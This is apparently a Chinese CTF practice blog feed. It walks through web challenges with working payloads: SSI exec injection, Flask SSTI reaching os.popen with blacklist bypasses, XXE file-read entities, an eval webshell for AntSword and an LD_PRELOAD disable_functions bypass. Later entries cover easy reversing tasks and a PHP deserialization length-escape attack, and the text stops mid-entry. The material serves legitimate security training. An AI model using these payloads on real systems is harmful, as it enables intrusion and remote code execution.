    <content type="html"><![CDATA[<h1 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h1><p>F12看到flag</p><p>有🍪吧</p><h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>进去是一个登陆页面</p><p><img src="https://s2.loli.net/2022/03/10/Ps3aMN7vRrX4t9Y.png"></p><p>进去随便试了几个,回显都一样,试着用dirsearch扫描看能不能找到突破口</p><p><img src="https://s2.loli.net/2022/03/10/R4ozQGmZ8eg9Swt.png"></p><p>你👱🏻‍经过相关查询发现这道题的关键是swp,正好被你👱🏻‍扫描到了</p><p>下面放出源代码</p><pre><code>&lt;?phpob_start();function get_hash()&#123;    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;    $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times    $content = uniqid().$random;    return sha1($content); &#125;header(&quot;Content-Type: text/html;charset=utf-8&quot;); ***if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )&#123;    $admin = &#39;6d0bc1&#39;;    if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;        echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;        $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;        $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);        $text = &#39;        ***        ***        &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;        ***        ***&#39;;        fwrite($shtml,$text);        fclose($shtml);        ***        echo &quot;[!] Header  error ...&quot;;    &#125; else &#123;        echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;        &#125;else&#123; ***&#125; ***?&gt;</code></pre><p>进行代🐴审计</p><p>uniqid()函数是基于以微秒计的当前时间，生成一个唯一的ID</p><p>sha1()函数计算字符串的SHA-1散列</p><p>password的MD5值前6位要等于6d0bc1</p><p>这里直接用python跑出md5加密前面是6d0bc1的密文</p><pre><code>     import hashlibfor i in range(1000000000):a = hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()if a[0:6] == &#39;6d0bc1&#39;:    print(i)    print(a)</code></pre><p><img src="https://s2.loli.net/2022/03/10/7yGMZWocNgqRfeQ.png"></p><p>抓包后传输过去,发现过了第一层,并发现上面给了个Url</p><p>代进去试试</p><p><img src="https://s2.loli.net/2022/03/10/tfMlmQkYhZ7sX3d.png"></p><p>这里输出了用户名的名字</p><p>既然这里是shtml,那么可以利用Apache SSI 远程命令执行漏洞上传一个shtml文件内容为<!--#exec cmd="ls ../"--></p><p>password既然是个固定值,那么唯一可控的地方就是username</p><p>可以在username这里整活</p><p><img src="https://s2.loli.net/2022/03/10/b6ea2ANL1GuSDzB.png"></p><p>将这里的url代入可以得到flag的位置</p><p><img src="https://s2.loli.net/2022/03/10/v83tOpzJnA59iyL.png"></p><p>再构造</p><p><img src="https://s2.loli.net/2022/03/10/SKq5M7mEFeYOpTz.png"></p><p>代入url就可以得到flag</p><h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>你👱🏻‍看到一开始就提示了是flask注入</p><p>然后这个输入框应该就是注入点,一般来说加密框把数据加密后就不会执行代码了,所以应该是解密框执行代码。</p><p>比如输入22</p><p><img src="https://s2.loli.net/2022/03/13/VYite69xjSsEKnZ.png"></p><p><img src="https://s2.loli.net/2022/03/13/BOim6qlPeFxvjpG.png"></p><p>发现存在ssti注入</p><p>输入</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>来查看根目录,如法炮制后得到</p><p><img src="https://s2.loli.net/2022/03/13/vTc68yPgWM4hR2e.png"></p><p>在🐶叫了,说明被ban掉了</p><p>这时候看看hint,告诉你👱🏻‍失败乃成功之👱‍♀️</p><p>你👱🏻‍想起来之前测试的时候,如果输入一些能让解密4️⃣🐴的东西,能跳出来新网页</p><p><img src="https://s2.loli.net/2022/03/13/A6nYskriZ1T2Mf9.png"></p><pre><code>@app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():if request.values.get(&#39;text&#39;) :    text = request.values.get(&quot;text&quot;)    text_decode = base64.b64decode(text.encode())    tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())    if waf(tmp) :        flash(&quot;no no no !!&quot;)        return redirect(url_for(&#39;decode&#39;))    res =  render_template_string(tmp)</code></pre><p>那么这里必须要拿下waf了</p><p>这里读源码</p><pre><code> &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://s2.loli.net/2022/03/13/dg6IKHQFtTaEbjn.png"></p><pre><code>def waf(str):black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;,&quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;]for x in black_list :if x in str.lower() :return 1</code></pre><p>可以看到这里过滤了flag和os</p><p>看来得用到字符串拼接了</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://s2.loli.net/2022/03/13/Ruj3IH6KzFcvClU.png"></p><p>这里拿到了flag的位置</p><pre><code>this_is_the_flag.txt</code></pre><p>再次对flag进行拼接</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://s2.loli.net/2022/03/13/Pb1vRBfGVXMpCFL.png"></p><h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>你👱🏻‍打开就是个登陆界面,又是注入了</p><p><img src="https://s2.loli.net/2022/03/15/qTCeRMjozyYfw53.png"></p><p>进行抓包,感觉这个username和password怪怪的</p><p><img src="https://s2.loli.net/2022/03/15/cqdmZHYRubP3i4L.png"></p><p>搜了一下,可能是xxe漏洞,偷个exp发过去试试</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY exp SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;exp;&lt;/username&gt;&lt;password&gt;aaaa&lt;/password&gt;&lt;/user&gt;</code></pre><p>没读到flag</p><p>再试试获取源🐴</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY exp SYSTEM &quot;php://filter/read=convert.base64-encode/resource=doLogin.php&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;exp;&lt;/username&gt;&lt;password&gt;aaaa&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="https://s2.loli.net/2022/03/15/uYm5JUiSWBwKgFo.png"></p><p>base64解密后得到</p><pre><code>&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &#39;admin&#39;; //账号$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;            $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    &#125;else&#123;            $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    &#125;&#125;catch(Exception $e)&#123;    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;%</code></pre><p>输入里面的username和password,果然成功登陆</p><p>但是没发现什么东西</p><p>这里又蒙了,这里好像也看不出什么有用的东西</p><p>再搜了一下,好像是要内网探测存活的主机获取/etc/hosts文件</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY exp SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;exp;&lt;/username&gt;&lt;password&gt;aaaa&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="https://s2.loli.net/2022/03/15/glTocIE1d2AD34H.png"></p><p>这里也没有可用信息,再读取另外一个/proc/net/arp文件</p><p><img src="https://s2.loli.net/2022/03/15/a34xiLGyPjBzNTE.png"></p><p>这里出现了flag和一个特殊ip 10.128.253.12</p><p>构造 </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY exp SYSTEM &quot;http://10.128.253.12&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;exp;&lt;/username&gt;&lt;password&gt;aaaa&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="https://s2.loli.net/2022/03/15/QJPCm18kIt35NTL.png"></p><p>有报错,这里使用intruder扫描C段</p><p>然后这个题目环境有病,导致最终做不出来,但是思路是这个思路。</p><h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><p>你👱🏻‍打开题目经典登录</p><p><img src="https://s2.loli.net/2022/03/16/BTQsJlkHWafiKpN.png"></p><p>这里已经提示了cookie,那就开始抓包</p><p><img src="https://s2.loli.net/2022/03/16/rmFYi1BLUWhf83k.png"></p><p>添加Cookie:monster=admin 这里成功登录</p><p><img src="https://s2.loli.net/2022/03/16/qiACB3JPHNOXLVv.png"></p><p>这里还能看到set-cookie里面的username,那么我们重新构造</p><pre><code>Cookie:monster=admin;username=admin</code></pre><p><img src="https://s2.loli.net/2022/03/16/jfhSOrbgsqAuoLC.png"></p><p>然后拿下</p><h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>你👱🏻‍进去是代码审计</p><p><img src="https://s2.loli.net/2022/03/16/ph5viQlRr19kxbJ.png"></p><p>这里意思很简单,Get的字符串不能超过40位,其次还需要绕过正则</p><p>这里需要用取反urlencode编码绕过</p><p>即对查询语句取反，然后编码。</p><p>在编码前加上~进行取反，括号没有被过滤，不用取反</p><p>所以构造</p><pre><code>&lt;?phpecho urlencode(~&#39;phpinfo&#39;);?&gt;</code></pre><p>得到%8F%97%8F%96%91%99%90</p><p>所以payload为</p><pre><code>?code=(~%8F%97%8F%96%91%99%90)();</code></pre><p><img src="https://s2.loli.net/2022/03/16/fCqIgMeRcHSd2oG.png"></p><p>这里可以看到被ban的函数</p><p>使用一句话木马连接蚁剑</p><pre><code>&lt;?php error_reporting(0);$a=&#39;assert&#39;;$b=urlencode(~$a);echo $b;echo &quot;&lt;br&gt;&quot;;$c=&#39;(eval($_POST[&quot;cmd&quot;]))&#39;;$d=urlencode(~$c);echo $d;?&gt;</code></pre><p><img src="https://s2.loli.net/2022/03/16/sfBtcAkbCn96dQr.png"></p><p>但点进去flag没东西,这里应该是因为之前被限制了函数</p><p>所以你👱🏻‍需要绕过被ban的函数。</p><p>你👱🏻‍搜了下,本来要用蚁剑的插件市场,但是最近莫名其妙打不开死个🐴</p><p>所以只能绕远路了</p><p>这里需要readflag才能得到flag,这里需要利用利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE</p><p>在/var/tmp/目录存在上传权限，上传我们的exp</p><p><a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p><p>这里是EXP地址</p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" title="EXP地址">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p><img src="https://s2.loli.net/2022/03/16/7gBWLSm8zX2vnYd.png"></p><p>这里的shell其实就是另外一个php改名,只是shell短一点更好写</p><p>这里构造exp执行命令</p><pre><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/shell.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><p>这里的payload是偷的网上的异或payload,后面的是根据上传的写的</p><p>执行得到flag</p><p><img src="https://s2.loli.net/2022/03/16/D1kW36lw5pc8yfe.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BSidesCF-2019-Futurella&quot;&gt;&lt;a href=&quot;#BSidesCF-2019-Futurella&quot; class=&quot;headerlink&quot; title=&quot;[BSidesCF 2019]Futurella&quot;&gt;&lt;/a&gt;[BSidesCF 2019]F</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>无职转生1</title>
    <link href="http://example.com/2022/03/01/%E6%97%A0%E8%81%8C%E8%BD%AC%E7%94%9F1/"/>
    <id>http://example.com/2022/03/01/%E6%97%A0%E8%81%8C%E8%BD%AC%E7%94%9F1/</id>
    <published>2022-03-01T15:10:05.000Z</published>
    <updated>2022-03-09T12:37:13.745Z</updated>
    
    <content type="html"><![CDATA[<p><strong>你👱🏻‍这学期要学逆向,期末需要offonline做5道逆向题</strong></p><p><strong>那你👱🏻‍得看一下逆向题了</strong></p><h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h1><p>确实是easy了,F12+shift(可以将程序中所有的字符串列出来)即可拿捏</p><p><img src="https://s2.loli.net/2022/03/04/MHeamvYSuGjxITg.png"></p><h1 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h1><p>你👱🏻‍照样F12+shift看到了</p><p><img src="https://s2.loli.net/2022/03/04/Ktf1kpuSOyaAFHv.png"></p><p>跟着点进去看源🐴,这个str2沾点不对劲</p><p><img src="https://s2.loli.net/2022/03/04/AEagh2IbM6WlSRJ.png"></p><p>跟进str2</p><p><img src="https://s2.loli.net/2022/03/04/sKLtzJn4buHNZla.png"></p><p>可以看到一个格式很像flag的,但是直接交其实交不了,再看伪代码处,有个对str2的判断,这里用的是asc码</p><p>这里的意思就是把o换成0</p><p>也就是flag{hell0_w0rld}</p><h1 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h1><p>你👱🏻‍反编译main函数,这个应该就是主题了吧</p><p><img src="https://s2.loli.net/2022/03/07/1ReCEWf85SkboqT.png"></p><p>再找到貌似是flag的字符串</p><p><img src="https://s2.loli.net/2022/03/07/RJz3SGfobgK9Zy4.png"></p><p>这里应该就是对{hacking_for_fun}进行变换了</p><p>这里很明显能看出来在遍历字符串,并将i和r换为1</p><p>所以flag为flag{hack1ng_fo1_fun}</p><h1 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h1><p><img src="https://s2.loli.net/2022/03/07/78hU3TPjIRkEHwW.png"></p><p>字符串这里把DBAPP换成flag就行了</p><h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><p>这道题首先需要用脱壳工具进行脱壳</p><p>脱壳后用F12找到含有flag的字符串得到主函数</p><p><img src="https://s2.loli.net/2022/03/07/5ipfLa9GCSgQeVJ.png"></p><p>这里就是跟HappyNewYear!进行比较</p><p>所以flag就是flag{HappyNewYear!}</p><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>查壳发现没有</p><p>直接反编译查看主函数</p><p><img src="https://s2.loli.net/2022/03/07/hnowauMgC1iQBtN.png"></p><p>进行代码分析发现第九行代码说明flag字符长度为33</p><p>输入一个长度为33的字符串,然后字符串里面的每个字母与前面的字母进行异或</p><p>逻辑很简单，就是把下一个和之前的一个异或，然后保存</p><p><img src="https://s2.loli.net/2022/03/09/Y1pQ26abzlt4SUG.png"></p><p>点击”Input your flag:\n”，提取里面的值</p><p>选中后按shift+E导出数据</p><p>这里应该是ASCII🐴</p><p>写个脚本</p><pre><code>a= [0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26,0x4F, 0x2E, 0x40, 0x11, 0x78, 0x0D,0x5A, 0x3B, 0x55, 0x11,0x70, 0x19, 0x46, 0x1F, 0x76, 0x22,0x4D, 0x23, 0x44, 0x0E, 0x67,0x06, 0x68, 0x0F, 0x47, 0x32,0x4F]s=&#39;&#39;s+=&#39;f&#39;for i in range(1,len(a)):s+=chr(a[i]^a[i-1])print(s)</code></pre><p>拿到flag</p><h1 id="helloword"><a href="#helloword" class="headerlink" title="helloword"></a>helloword</h1><p>下载apk文件 用apk模式打开 查找字符串即可</p><p><img src="https://s2.loli.net/2022/03/09/fFQBv36gM2UzbLX.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;你👱🏻‍这学期要学逆向,期末需要offonline做5道逆向题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;那你👱🏻‍得看一下逆向题了&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;easyre&quot;&gt;&lt;a href=&quot;#easyre&quot; class=&quot;h</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>你爹刷题3</title>
    <link href="http://example.com/2022/03/01/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%983/"/>
    <id>http://example.com/2022/03/01/%E4%BD%A0%E7%88%B9%E5%88%B7%E9%A2%983/</id>
    <published>2022-03-01T12:30:21.000Z</published>
    <updated>2022-03-02T09:45:30.983Z</updated>
    
    <content type="html"><![CDATA[<p><strong>你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多</strong></p><p><strong>你👱🏻‍太拉胯了,只能继续看题</strong></p><p><strong>否则你👱🏻‍只能从CTF的世界里Get Out了</strong></p><p><strong>你👱🏻‍现在开学进入下赛季了,但是还是得刷点题</strong></p><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p>你👱🏻‍打开题目是这样</p><p><img src="https://s2.loli.net/2022/03/01/lrJzEciQ86Wa4qC.png"></p><p>用dirsearch扫一下,扫到<a href="http://www.zip/">www.zip</a></p><p><img src="https://s2.loli.net/2022/03/02/qydR7skJr24D8eT.png"></p><p>下载</p><p><img src="https://s2.loli.net/2022/03/02/rDfuPiVblg1K4zL.png"></p><p>里面的源码一个一个审计</p><p><img src="https://s2.loli.net/2022/03/02/ynlK1uQd9RvcgJU.png"></p><p>其中,在config文件里面你👱🏻‍发现了flag和username为root</p><p>尝试用root为username进行登陆,而意外进入的注册页面,注册完成后再进行登录,成功后进入update.php界面</p><p><img src="https://s2.loli.net/2022/03/02/tNZGnw8TQKfoJVm.png"></p><p>这是profile的php部分源码</p><pre><code>&lt;?phprequire_once(&#39;class.php&#39;);if($_SESSION[&#39;username&#39;] == null) &#123;    die(&#39;Login First&#39;);    &#125;$username = $_SESSION[&#39;username&#39;];$profile=$user-&gt;show_profile($username);if($profile  == null) &#123;    header(&#39;Location: update.php&#39;);&#125;else &#123;    $profile = unserialize($profile);    $phone = $profile[&#39;phone&#39;];    $email = $profile[&#39;email&#39;];    $nickname = $profile[&#39;nickname&#39;];    $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));?&gt;</code></pre><p>在profile文件里面发现了敏感函数,unserialize,file_get_contents</p><pre><code>&lt;?phprequire_once(&#39;class.php&#39;);if($_SESSION[&#39;username&#39;] == null) &#123;    die(&#39;Login First&#39;);    &#125;if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;    $username = $_SESSION[&#39;username&#39;];    if(!preg_match(&#39;/^\d&#123;11&#125;$/&#39;, $_POST[&#39;phone&#39;]))        die(&#39;Invalid phone&#39;);    if(!preg_match(&#39;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#39;, $_POST[&#39;email&#39;]))        die(&#39;Invalid email&#39;);        if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)        die(&#39;Invalid nickname&#39;);    $file = $_FILES[&#39;photo&#39;];    if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)        die(&#39;Photo size error&#39;);    move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]));    $profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];    $profile[&#39;email&#39;] = $_POST[&#39;email&#39;];    $profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];    $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);    $user-&gt;update_profile($username, serialize($profile));    echo &#39;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#39;;&#125;else &#123;?&gt;</code></pre><p>在update文件里面发现了serialize</p><p>你👱🏻‍:这代码审计也忒多了</p><p>这里应该是要让file_get_contents请求config.php文件</p><p>看一下这个参数的传递过程</p><p>1.在profile.php里，它是$profile数组里键名为photo的键值</p><pre><code>  $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></pre><p>2.$profile又是通过$user的show_profile函数传过来的，而且传过去了$username参数：</p><pre><code>$username = $_SESSION[&#39;username&#39;];$profile=$user-&gt;show_profile($username);if($profile  == null) &#123;    header(&#39;Location: update.php&#39;);&#125;</code></pre><p>3.跟进class.php,user类中</p><pre><code>public function show_profile($username) &#123;    $username = parent::filter($username);    $where = &quot;username = &#39;$username&#39;&quot;;    $object = parent::select($this-&gt;table, $where);    return $object-&gt;profile;&#125;</code></pre><p>4.user类继承了mysql类，这里先调用了父类的filter函数。<br>这里是替换字符串中的单引号和反斜杠为下划线 ，并且替换多个字符串为hacker。<br>implode函数是表示把数组拼接起来，拼接符是 “|”：</p><pre><code> public function filter($string) &#123;    $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);    $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;    $string = preg_replace($escape, &#39;_&#39;, $string);    $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);    $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;    return preg_replace($safe, &#39;hacker&#39;, $string);&#125;</code></pre><p>5.然后show_profile里面又调用了父类的select函数：</p><pre><code>public function select($table, $where, $ret = &#39;*&#39;) &#123;    $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;    $result = mysql_query($sql, $this-&gt;link);    return mysql_fetch_object($result);&#125;</code></pre><p>6.可以看到数据是从表里取出来的,在select函数的下面找到相关函数：</p><pre><code>public function update($table, $key, $value, $where) &#123;    $sql = &quot;UPDATE $table SET $key = &#39;$value&#39; WHERE $where&quot;;    return mysql_query($sql);&#125;</code></pre><p>7.再查看哪里调用了这个函数</p><pre><code>     public function update_profile($username, $new_profile) &#123;    $username = parent::filter($username);    $new_profile = parent::filter($new_profile);    $where = &quot;username = &#39;$username&#39;&quot;;    return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);&#125;</code></pre><p>8.再找update_profile的调用</p><pre><code>    move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]));    $profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];    $profile[&#39;email&#39;] = $_POST[&#39;email&#39;];    $profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];    $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);    $user-&gt;update_profile($username, serialize($profile));    echo &#39;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#39;;&#125;else &#123;</code></pre><p>9.这里对profile进行的赋值,通过POST进行参数的传递</p><p>总结为</p><pre><code>profile.php的file_get_contents =》 show_profile() =》 class.php里的select() =》 mysql类 =》 class.php里的update() =》 update_profile() =》 update.php里调用传参。</code></pre><p>现在一步一步进行绕过</p><p>对于photo参数</p><pre><code>    $file = $_FILES[&#39;photo&#39;];    if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)        die(&#39;Photo size error&#39;);    move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]));    $profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];    $profile[&#39;email&#39;] = $_POST[&#39;email&#39;];    $profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];    $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code></pre><p>对photo进行了大小限制,并且对它进行了md5</p><p>这意味着我们不能直接传了</p><p>但是我们可以利用它的前一个参数nickname</p><p>这里就要利用到序列化的拼接+伪造，对nickname参数攻击，比如该序列化字符串：</p><pre><code> a:3:&#123;s:4:&quot;dddd&quot;;s:6:&quot;ddddhm&quot;;&#125;</code></pre><p>我们在dddd的地方输入 dddd”;s:10:“buhaobuhao”;} 就变成了：</p><pre><code> a:3:&#123;s:25:&quot;dddd&quot;;s:10:&quot;buhaobuhao&quot;;&#125;&quot;;s:6:&quot;ddddhm&quot;;&#125;</code></pre><p>但是相应的，dddd前面的字符串长度也变了，变成25了，所以这里会报错。我们就要想办法把dddd变成25位长度，还差21位。</p><p>之前的mysql类里面有个filter()函数对参数值进行了处理替换：</p><p>insert\select\update\delete都是6位长度，hacker也是6位长度，where是5位长度，而且执行的是替换操作。那么我们岂不是可以通过替换操作，把原本5位长度的where，替换成了6位的hacker</p><p>那这样我们就变长了一位，而且preg_replace函数默认是替换所有的。那么我们差几位，就输入几个where硬刷长度</p><p>还有nickname的过滤</p><pre><code>    if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)        die(&#39;Invalid nickname&#39;);</code></pre><p>这里先对它进行了正则，这个正则的意思是匹配除了a-zA-Z0-9_之外的字符,因为 “^” 符号是在 “[]” 里面，所以是非的意思,不是开始的意思。</p><p>然后 “||” 后面判断了它的长度是否大于10</p><p>这里考虑用数组绕过</p><p>这里可牵一张表</p><pre><code>md5(Array()) = nullsha1(Array()) = nullereg(pattern,Array()) =nullpreg_match(pattern,Array()) = falsestrcmp(Array(), “abc”) =nullstrpos(Array(),“abc”) = nullstrlen(Array()) = null</code></pre><p>所以传入数组就能绕过</p><p>所以构造</p><pre><code>nickname[]=where&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>前面多了个“}”,是因为构造传入的nickname是数组</p><p>比如</p><pre><code>       &lt;?phpfunction filter($str)&#123;return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);&#125;class A&#123;public $name=&#39;aaaa&#39;;public $pass=&#39;123456&#39;;public $nickname = array(&#39;a&#39; =&gt; &#39;Apple&#39; ,&#39;b&#39; =&gt; &#39;banana&#39; , &#39;c&#39; =&gt; &#39;Coconut&#39;); &#125;$AA=new A();echo serialize($AA).&quot;\n&quot;;// $res=filter(serialize($AA));// $c=unserialize($res);// echo 